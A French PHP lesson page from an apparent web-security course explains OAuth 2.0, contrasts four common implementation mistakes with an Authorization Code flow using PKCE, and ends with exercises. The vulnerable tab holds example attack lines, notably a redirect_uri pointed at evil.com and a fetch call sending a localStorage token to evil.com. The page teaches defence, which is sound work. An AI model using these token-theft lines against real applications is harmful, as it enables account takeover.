<?php include __DIR__ . '/../../../includes/header.php'; ?>

<div class="page-header">
    <h2>Ch5 — Ex2 : Authentification OAuth 2.0</h2>
    <p>Flux d'autorisation, tokens d'accès, et intégration avec des providers externes.</p>
    <span class="duration">35 min</span>
</div>

<div class="card">
    <h3>Qu'est-ce qu'OAuth 2.0 ?</h3>
    <div class="explanation">
        <h4>Problème résolu</h4>
        <p>Vous voulez qu'une application tierce accède à vos données Google Drive <strong>sans lui donner votre mot de passe Google</strong>. OAuth 2.0 permet cette <strong>autorisation déléguée</strong>.</p>
    </div>

    <h4 style="margin-top:20px;">Les 4 acteurs</h4>
    <table>
        <tr><th>Acteur</th><th>Rôle</th><th>Exemple</th></tr>
        <tr>
            <td><strong>Resource Owner</strong></td>
            <td>L'utilisateur qui possède les données</td>
            <td>Vous</td>
        </tr>
        <tr>
            <td><strong>Client</strong></td>
            <td>L'application qui demande l'accès</td>
            <td>L'application tierce</td>
        </tr>
        <tr>
            <td><strong>Authorization Server</strong></td>
            <td>Délivre les tokens d'accès</td>
            <td>accounts.google.com</td>
        </tr>
        <tr>
            <td><strong>Resource Server</strong></td>
            <td>Héberge les données protégées</td>
            <td>drive.google.com/api</td>
        </tr>
    </table>
</div>

<div class="card">
    <div class="tabs">
        <button class="tab active" data-tab="vuln">Flux vulnérable</button>
        <button class="tab secure" data-tab="secure">Flux sécurisé</button>
    </div>

    <!-- VULNÉRABLE -->
    <div id="vuln" class="tab-content active">
        <div class="alert alert-danger">
            VULNÉRABLE : Implémentation OAuth avec des erreurs de sécurité courantes.
        </div>

        <h3>Erreurs courantes dans OAuth</h3>

        <h4>Erreur 1 : Implicit Flow (déprécié)</h4>
        <div class="code-block">
<span class="comment">// DANGEREUX : le token est dans l'URL (visible dans l'historique, logs, referer)</span>
<span class="vulnerable">// Redirection après autorisation :
https://app.com/callback#access_token=abc123&token_type=bearer

// Le token est dans le fragment (#) → accessible par JavaScript
// → vol possible par XSS</span>
        </div>

        <h4 style="margin-top:15px;">Erreur 2 : Pas de paramètre state</h4>
        <div class="code-block">
<span class="comment">// DANGEREUX : pas de protection CSRF sur le callback</span>
<span class="vulnerable">// L'attaquant peut forger un lien :
https://app.com/callback?code=CODE_ATTAQUANT

// La victime clique → son compte est lié au compte de l'attaquant !</span>
        </div>

        <h4 style="margin-top:15px;">Erreur 3 : Redirect URI non validé</h4>
        <div class="code-block">
<span class="comment">// DANGEREUX : redirect_uri accepte n'importe quelle URL</span>
<span class="vulnerable">// L'attaquant modifie le redirect_uri :
https://auth.google.com/authorize?
  client_id=APP_ID&
  redirect_uri=https://evil.com/steal&  // ← Redirige vers l'attaquant !
  response_type=code

// Le code d'autorisation est envoyé au site de l'attaquant</span>
        </div>

        <h4 style="margin-top:15px;">Erreur 4 : Token stocké en localStorage</h4>
        <div class="code-block">
<span class="vulnerable">// Vulnérable au XSS : tout script peut lire localStorage
localStorage.setItem('access_token', response.access_token);

// Un XSS vole immédiatement le token :
fetch('https://evil.com/steal?token=' + localStorage.getItem('access_token'));</span>
        </div>
    </div>

    <!-- SÉCURISÉ -->
    <div id="secure" class="tab-content">
        <div class="alert alert-success">
            SÉCURISÉ : Authorization Code Flow avec PKCE (recommandé).
        </div>

        <h3>Authorization Code Flow avec PKCE</h3>
        <div class="code-block">
<span class="secure">┌──────────┐     ┌──────────────┐     ┌──────────────┐
│          │     │ Authorization│     │   Resource   │
│  Client  │     │    Server    │     │    Server    │
│  (App)   │     │  (Google)    │     │ (Google API) │
└────┬─────┘     └──────┬───────┘     └──────┬───────┘
     │                  │                    │
     │ 1. Redirect user │                    │
     │  + code_challenge│                    │
     │─────────────────→│                    │
     │                  │                    │
     │ 2. User logs in  │                    │
     │   + authorizes   │                    │
     │                  │                    │
     │ 3. Auth code     │                    │
     │←─────────────────│                    │
     │                  │                    │
     │ 4. Exchange code │                    │
     │  + code_verifier │                    │
     │─────────────────→│                    │
     │                  │                    │
     │ 5. Access token  │                    │
     │←─────────────────│                    │
     │                  │                    │
     │ 6. API request + token               │
     │──────────────────────────────────────→│
     │                                       │
     │ 7. Protected data                     │
     │←──────────────────────────────────────│</span>
        </div>

        <hr style="margin:20px 0;">

        <h3>Implémentation PHP</h3>
        <div class="code-block">
<span class="comment">// Étape 1 : Générer le PKCE challenge</span>
<span class="secure">$codeVerifier = bin2hex(random_bytes(32));
$codeChallenge = rtrim(strtr(
    base64_encode(hash('sha256', $codeVerifier, true)),
    '+/', '-_'), '=');
$_SESSION['code_verifier'] = $codeVerifier;
$_SESSION['oauth_state'] = bin2hex(random_bytes(16));</span>

<span class="comment">// Étape 2 : Rediriger vers le provider</span>
<span class="secure">$authUrl = 'https://accounts.google.com/o/oauth2/v2/auth?' . http_build_query([
    'client_id'             => $clientId,
    'redirect_uri'          => 'https://app.com/callback',  // URL exacte, whitelist
    'response_type'         => 'code',
    'scope'                 => 'openid email profile',
    'state'                 => $_SESSION['oauth_state'],     // Anti-CSRF !
    'code_challenge'        => $codeChallenge,
    'code_challenge_method' => 'S256',
]);
header('Location: ' . $authUrl);</span>

<span class="comment">// Étape 3 : Callback — vérifier le state et échanger le code</span>
<span class="secure">// callback.php
if ($_GET['state'] !== $_SESSION['oauth_state']) {
    die('Erreur CSRF : state invalide');
}

$response = file_get_contents('https://oauth2.googleapis.com/token', false,
    stream_context_create(['http' => [
        'method'  => 'POST',
        'header'  => 'Content-Type: application/x-www-form-urlencoded',
        'content' => http_build_query([
            'grant_type'    => 'authorization_code',
            'code'          => $_GET['code'],
            'redirect_uri'  => 'https://app.com/callback',
            'client_id'     => $clientId,
            'client_secret' => $clientSecret,
            'code_verifier' => $_SESSION['code_verifier'],  // PKCE
        ]),
    ]])
);
$tokens = json_decode($response, true);
// $tokens['access_token'], $tokens['id_token'], $tokens['refresh_token']</span>
        </div>

        <hr style="margin:20px 0;">

        <h3>Bonnes pratiques OAuth 2.0</h3>
        <ul style="margin:10px 0 0 20px;">
            <li><strong>Toujours utiliser PKCE</strong> (même pour les apps serveur)</li>
            <li><strong>Toujours vérifier le state</strong> (anti-CSRF)</li>
            <li><strong>Valider le redirect_uri</strong> exactement (pas de wildcard)</li>
            <li><strong>Ne jamais utiliser Implicit Flow</strong> (déprécié)</li>
            <li><strong>Stocker les tokens en cookie HttpOnly</strong>, pas en localStorage</li>
            <li><strong>Utiliser des scopes minimaux</strong> (principe de moindre privilège)</li>
            <li><strong>Refresh tokens</strong> : rotation à chaque usage, stockage sécurisé</li>
        </ul>
    </div>
</div>

<div class="card">
    <h3>Simulation : "Se connecter avec Google"</h3>
    <div class="explanation">
        <h4>Flux utilisateur</h4>
        <p>Voici ce qui se passe quand vous cliquez "Sign in with Google" :</p>
    </div>

    <div style="margin:15px 0; padding:20px; background:var(--light); border-radius:8px; text-align:center;">
        <button class="btn btn-primary" style="padding:12px 30px;" onclick="alert('1. Redirection vers accounts.google.com\n2. L\'utilisateur se connecte à Google\n3. Google redirige vers votre callback avec un code\n4. Votre serveur échange le code contre un token\n5. Votre serveur crée une session locale')">
            Se connecter avec Google (simulé)
        </button>
    </div>

    <h3 style="margin-top:15px;">Exercices</h3>
    <ol style="margin:10px 0 0 20px;">
        <li>Identifiez les 4 erreurs de sécurité dans l'onglet "Flux vulnérable"</li>
        <li>Pourquoi le paramètre <code>state</code> est-il essentiel ?</li>
        <li>Pourquoi PKCE protège-t-il même les applications serveur ?</li>
        <li><strong>Défi :</strong> Sur un site utilisant OAuth, inspectez l'URL de redirection vers le provider et identifiez les paramètres (client_id, redirect_uri, scope, state)</li>
    </ol>
</div>

<a href="index.php" class="btn btn-primary">← Retour au chapitre 5</a>

<?php include __DIR__ . '/../../../includes/footer.php'; ?>
